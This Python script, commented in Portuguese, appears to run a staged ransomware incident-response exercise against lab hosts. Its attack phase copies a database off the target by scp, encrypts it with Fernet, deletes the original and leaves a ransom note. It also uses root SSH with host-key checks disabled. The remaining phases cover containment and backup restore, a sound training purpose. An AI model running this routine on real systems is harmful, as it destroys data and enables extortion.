import subprocess, time, datetime, os
from cryptography.fernet import Fernet

class C:
    R ="\033[0m"
    V ="\033[92m"   # verde
    A ="\033[93m"   # amarelo
    E ="\033[91m"   # vermelho
    CI="\033[96m"   # ciano
    B ="\033[1m"    # negrito

def log(msg, cor=C.R, pre=""):
    h = datetime.datetime.now().strftime("%H:%M:%S")
    print(f"{cor}{pre}[{h}] {msg}{C.R}")
    with open("/logs/cenario1.log", "a") as f:
        f.write(f"[{h}] {msg}\n")

def log_producao(msg, nivel="INFO"):
    """Escreve log visivel no terminal da producao via SSH."""
    h = datetime.datetime.now().strftime("%H:%M:%S")
    entrada = f"[{h}] [{nivel}] {msg}"
    exec_ssh("srv-producao", f"echo '{entrada}' >> /app/logs/incidente.log")

def sep(titulo="", cor=C.CI):
    linha = "=" * 58
    print(f"\n{cor}{C.B}{linha}{C.R}")
    if titulo:
        print(f"{cor}{C.B}  {titulo}{C.R}")
        print(f"{cor}{C.B}{linha}{C.R}")
    print()

def aguardar(msg="Pressione ENTER para continuar..."):
    print(f"\n{C.A}{C.B}  >>> {msg}{C.R}\n")
    input()

def exec_ssh(host, cmd):
    r = subprocess.run(
        ["ssh", "-o", "StrictHostKeyChecking=no",
         "-p", "22", f"root@{host}", cmd],
        capture_output=True, text=True
    )
    return r.stdout.strip(), r.returncode

os.makedirs("/logs", exist_ok=True)
open("/logs/cenario1.log", "w").close()

sep("CENARIO 1 - ATAQUE DE RANSOMWARE", C.CI)
log("CLT Distribuidora S.A. - Simulacao de Incidente P1")
log("Stack: Alpine Linux 3.19 + Fernet (AES-128) + Docker")
log(f"Atacante: srv-atacante", C.CI)
log(f"Alvo:     srv-producao", C.E, ">>> ")
print(f"\n  {C.A}Abra o PuTTY da producao e rode:{C.R}")
print(f"  {C.B}tail -f /app/logs/incidente.log{C.R}\n")

aguardar("Producao monitorando? Pressione ENTER para iniciar...")

sep("FASE 1 - SITUACAO NORMAL")

log_producao("Sistema CRM operando normalmente", "OK")
log_producao("Equipe de vendas registrando pedidos", "OK")

log("Verificando estado do servidor alvo...", C.V)
time.sleep(1)

out, _ = exec_ssh("srv-producao", "sqlite3 /app/banco/clt.db 'SELECT COUNT(*) FROM clientes;'")
log(f"Clientes em srv-producao: {out}", C.V)
log_producao(f"Banco de dados ativo - {out} clientes cadastrados", "OK")

out, _ = exec_ssh("srv-producao", "sqlite3 /app/banco/clt.db 'SELECT COUNT(*) FROM pedidos;'")
log(f"Pedidos ativos em srv-producao: {out}", C.V)
log_producao(f"Pedidos ativos: {out}", "OK")

out, _ = exec_ssh("srv-producao", "ls -lh /app/banco/clt.db")
log(f"Arquivo do banco: {out}", C.V)

aguardar("Sistema normal confirmado. ENTER para simular o ataque...")

sep("FASE 2 - ATAQUE DE RANSOMWARE", C.E)

log("Iniciando conexao nao autorizada com srv-producao...", C.A)
log_producao("ALERTA: conexao suspeita detectada na porta 22", "WARN")
time.sleep(1)

log("Conexao estabelecida! Mapeando sistema de arquivos...", C.E, "!!! ")
log_producao("ALERTA: processo desconhecido acessando /app/banco/", "WARN")
time.sleep(0.8)

log("Gerando chave de criptografia Fernet (AES-128)...", C.A)
CHAVE = Fernet.generate_key()
fernet = Fernet(CHAVE)
log(f"Chave gerada: {CHAVE.decode()[:40]}...", C.E)
log("Chave retida pelo atacante - sem ela nao ha recuperacao!", C.E, "!!! ")
time.sleep(0.5)

with open("/logs/chave_ransomware.key", "wb") as f:
    f.write(CHAVE)

aguardar("ENTER para criptografar o banco de dados...")

log("Baixando banco de dados de srv-producao...", C.A)
log_producao("CRITICO: transferencia de dados detectada - clt.db copiado!", "CRIT")
time.sleep(1)

r = subprocess.run(
    ["scp", "-o", "StrictHostKeyChecking=no",
     "root@srv-producao:/app/banco/clt.db", "/tmp/clt.db"],
    capture_output=True, text=True
)

if os.path.exists("/tmp/clt.db"):
    log("Banco baixado com sucesso!", C.E, "!!! ")

    with open("/tmp/clt.db", "rb") as f:
        dados = f.read()

    dados_criptografados = fernet.encrypt(dados)
    log(f"Criptografando {len(dados)} bytes com AES-128...", C.A)
    time.sleep(0.8)

    with open("/tmp/clt.db.locked", "wb") as f:
        f.write(dados_criptografados)

    log(f"Arquivo criptografado: {len(dados_criptografados)} bytes", C.E)

    subprocess.run(
        ["scp", "-o", "StrictHostKeyChecking=no",
         "/tmp/clt.db.locked", "root@srv-producao:/app/banco/clt.db.locked"],
        capture_output=True
    )
    exec_ssh("srv-producao", "rm -f /app/banco/clt.db")
    exec_ssh("srv-producao",
        "echo 'RANSOMWARE: Pague 10 BTC' > /app/banco/LEIA-ME.txt")

    log_producao("CRITICO: /app/banco/clt.db REMOVIDO!", "CRIT")
    log_producao("CRITICO: arquivo clt.db.locked encontrado no sistema!", "CRIT")
    log_producao("CRITICO: CRM INDISPONIVEL - banco de dados inacessivel!", "CRIT")

    out, _ = exec_ssh("srv-producao", "ls /app/banco/")
    log(f"Estado do banco em srv-producao:\n    {out}", C.E)

log("SISTEMA COMPROMETIDO - CRM INDISPONIVEL", C.E, "!!! ")
log("Mensagem do atacante: Pague 10 BTC para recuperar seus dados", C.E, "!!! ")

aguardar("ENTER para acionar o CSIRT...")

sep("FASE 3 - ACIONAMENTO DO CSIRT", C.A)

log_producao("CSIRT acionado - incidente P1 confirmado", "CSIRT")
log_producao("Canal de crise aberto: #incidente-p1-ransomware", "CSIRT")

log("Coordenador de Incidentes acionado", C.A)
log("Canal de crise: #incidente-p1-ransomware", C.A)
log("DPO notificado - possivel exposicao de dados pessoais", C.A)
log(f"Timestamp: {datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", C.A)
log_producao(f"Timestamp oficial do incidente: {datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", "CSIRT")

aguardar("ENTER para iniciar a contencao...")

sep("FASE 4 - CONTENCAO", C.A)

log("Isolando srv-producao da rede interna via iptables...", C.A)
exec_ssh("srv-producao", "iptables -I INPUT -j DROP && iptables -I OUTPUT -j DROP")
time.sleep(0.5)

log_producao("Servidor ISOLADO da rede - iptables DROP aplicado", "CONT")
log("srv-producao ISOLADO da rede", C.V)
log("Integracoes com ERPs suspensas", C.A)
log("Servidor NAO desligado - memoria preservada para forense", C.CI)
log_producao("Memoria preservada para analise forense", "CONT")

aguardar("ENTER para restaurar via backup WORM...")

sep("FASE 5 - RECUPERACAO VIA BACKUP WORM", C.V)

# Liberar rede para acessar o backup
exec_ssh("srv-producao", "iptables -F")
log_producao("Rede restaurada para operacao de restore", "RESTO")
time.sleep(1)

log("Verificando backup WORM em srv-producao...", C.A)
time.sleep(1)
out, code = exec_ssh("srv-producao", "ls -lh /app/backup/")
if code == 0 and "clt_backup.db" in out:
    log(f"Backup WORM encontrado!", C.V)
    log(f"  {out}", C.V)
    log_producao("Backup WORM localizado em /app/backup/clt_backup.db", "RESTO")
else:
    log("ERRO: backup nao encontrado!", C.E)
    exit(1)

out, _ = exec_ssh("srv-producao", "md5sum /app/backup/clt_backup.db")
log(f"Hash MD5 verificado: {out}", C.V)
log_producao(f"Integridade do backup confirmada - MD5: {out[:32]}", "RESTO")

aguardar("ENTER para executar o restore...")

log("Removendo arquivos comprometidos...", C.A)
exec_ssh("srv-producao", "rm -f /app/banco/clt.db.locked /app/banco/LEIA-ME.txt")
log_producao("Arquivos criptografados removidos", "RESTO")
time.sleep(0.5)

log("Restaurando banco a partir do backup WORM...", C.A)
exec_ssh("srv-producao", "cp /app/backup/clt_backup.db /app/banco/clt.db")
time.sleep(0.8)
log("Restore concluido!", C.V)
log_producao("Banco de dados restaurado com sucesso!", "RESTO")

sep("FASE 6 - VALIDACAO POS-RESTORE", C.V)

log("Validando integridade dos dados recuperados...", C.A)
log_producao("Iniciando validacao pos-restore...", "VALID")
time.sleep(1)

todos_ok = True
for tabela in ["clientes", "pedidos", "catalogo"]:
    out, _ = exec_ssh("srv-producao",
        f"sqlite3 /app/banco/clt.db 'SELECT COUNT(*) FROM {tabela};'")
    ok = out.strip() == "5"
    status = f"{C.V}[OK]{C.R}" if ok else f"{C.E}[FALHA]{C.R}"
    print(f"    {status} Tabela {tabela}: {out} registro(s)")
    nivel = "OK" if ok else "ERRO"
    log_producao(f"Tabela {tabela}: {out} registros - {nivel}", nivel)
    if not ok:
        todos_ok = False
    time.sleep(0.4)

if todos_ok:
    log("Todos os dados validados - banco 100% integro!", C.V)
    log_producao("Validacao concluida - banco 100% integro!", "OK")

log("Patch de seguranca aplicado", C.V)
log("Varredura concluida - ambiente limpo", C.V)
log_producao("Patch aplicado - ambiente liberado para operacao", "OK")

aguardar("ENTER para encerrar o incidente...")

sep("FASE 7 - ENCERRAMENTO", C.CI)

log_producao("CRM liberado para os usuarios", "OK")
log_producao("Notificacao ANPD preparada - prazo 72h iniciado", "LGPD")

log("Notificacao preparada para ANPD - prazo 72h (LGPD Art. 48)", C.A)
log("Equipe comercial informada - CRM disponivel", C.V)
log("Sistema liberado para os usuarios", C.V)

sep("RESULTADO DO CENARIO 1", C.V)
log("INCIDENTE ENCERRADO COM SUCESSO", C.V, ">>> ")
log("Downtime: dentro do RTO de 4h definido na BIA", C.V)
log("Dados recuperados: 100% via backup WORM", C.V)
log("Criptografia real: Fernet AES-128", C.V)
log("Chave do atacante salva em: /logs/chave_ransomware.key", C.CI)
log("Log do atacante: /logs/cenario1.log", C.CI)
log("Log da producao: /app/logs/incidente.log", C.CI)
print()